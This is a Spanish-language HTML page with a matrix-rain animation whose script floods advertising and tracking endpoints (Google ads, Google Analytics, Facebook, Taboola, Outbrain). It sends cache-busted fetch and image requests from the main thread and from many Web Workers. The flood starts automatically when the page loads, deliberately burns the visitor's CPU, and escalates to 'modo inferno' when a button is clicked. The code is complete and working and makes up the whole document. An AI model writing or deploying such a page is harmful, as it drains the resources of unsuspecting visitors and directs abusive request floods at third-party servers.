<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Cuidado no entrar rastreadores</title>
<style>
body{
  margin:0;
  background:black;
  color:#00ff00;
  font-family:monospace;
  overflow:hidden;
  text-align:center;
}
h1{
  margin-top:40px;
  font-size:5rem;
  animation: blink 0.2s infinite;
  text-shadow: 0 0 40px red;
}
#contador{
  font-size:3rem;
  margin:20px;
  color:#ff0000;
  text-shadow: 0 0 30px red;
}
button{
  padding:40px 80px;
  font-size:2.6rem;
  background:#c00;
  color:white;
  border:none;
  cursor:pointer;
  border-radius:12px;
  box-shadow:0 0 60px red;
}
@keyframes blink{ 50%{ opacity:0.03; } }
</style>
</head>
<body>
<h1>⚠ ZONA INFESTADA ⚠</h1>
<div id="contador">Requests enviadas: 0</div>

<canvas id="canvas1" style="position:fixed; top:0; left:0; z-index:-1; opacity:0.2;"></canvas>
<canvas id="canvas2" style="position:fixed; top:0; left:0; z-index:-1; opacity:0.15;"></canvas>

<button onclick="activarModoNuclear()">
☢ ACTIVAR MODO INFERNO ☢
</button>

<div id="warning">Esto debería llegar cerca del 100% 🔥</div>

<script>
// Recursos
const resources = [
  "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",
  "https://securepubads.g.doubleclick.net/tag/js/gpt.js",
  "https://connect.facebook.net/en_US/fbevents.js",
  "https://www.google-analytics.com/analytics.js",
  "https://googleads.g.doubleclick.net/pagead/ads",
  "https://cdn.taboola.com/lib/native.js",
  "https://widgets.outbrain.com/outbrain.js"
];

let total = 0;
let running = false;
let workers = [];

// === CANVAS DOBLE INTENSIVO ===
function createMatrix(canvas, speed) {
  const ctx = canvas.getContext("2d");
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  
  const chars = "01アイウエオ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ$@#";
  const fontSize = 13;
  const columns = canvas.width / fontSize;
  const drops = Array(Math.floor(columns)).fill(1);

  function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ff00";
    ctx.font = fontSize + "px monospace";

    for(let i = 0; i < drops.length; i++) {
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      
      if(drops[i] * fontSize > canvas.height && Math.random() > 0.96)
        drops[i] = 0;
      drops[i]++;
    }
  }
  setInterval(draw, speed);
}

const c1 = document.getElementById("canvas1");
const c2 = document.getElementById("canvas2");
createMatrix(c1, 25);
createMatrix(c2, 18);

// Web Workers masivos
function createWorker() {
  const code = `
    self.onmessage = function() {
      setInterval(() => {
        for(let i = 0; i < 12; i++) {
          fetch("${resources[Math.floor(Math.random()*resources.length)]}?t=" + Date.now() + Math.random(), 
          {mode: "no-cors", cache: "no-store"}).catch(()=>{});
        }
      }, 0);
    };
  `;
  const blob = new Blob([code], {type: "application/javascript"});
  const worker = new Worker(URL.createObjectURL(blob));
  worker.postMessage("");
  workers.push(worker);
}

function spamMainThread() {
  if (!running) return;

  const url = resources[Math.floor(Math.random() * resources.length)];
  const cb = "?t=" + Date.now() + "&r=" + Math.random();

  for(let i = 0; i < 8; i++) {
    fetch(url + cb, {mode: 'no-cors', cache: 'no-store'}).catch(() => {});
    
    const img = new Image();
    img.src = url + cb;
  }

  // Pequeño cálculo dummy para quemar CPU
  let x = 0;
  for(let i = 0; i < 8000; i++) x += Math.random();

  total += 20;
  document.getElementById("contador").innerText = `Requests enviadas: ${total.toLocaleString()}`;

  setTimeout(spamMainThread, 0);
}

function activarModoNuclear() {
  running = true;
  document.body.style.background = "#300";
  document.querySelector("h1").innerText = "☢ MODO INFERNO ACTIVADO ☢";

  // Máximo Workers
  for(let i = 0; i < 10; i++) {
    createWorker();
  }

  // Ráfaga inicial extrema
  for(let i = 0; i < 250; i++) {
    setTimeout(spamMainThread, i * 2);
  }

  spamMainThread();
  alert("¡Ahora sí debería estar cerca del 100%! 🔥");
}

// Inicio automático fuerte
running = true;
for(let i = 0; i < 5; i++) createWorker();
setTimeout(() => {
  for(let i = 0; i < 120; i++) spamMainThread();
}, 400);

spamMainThread();
</script>
</body>
</html>
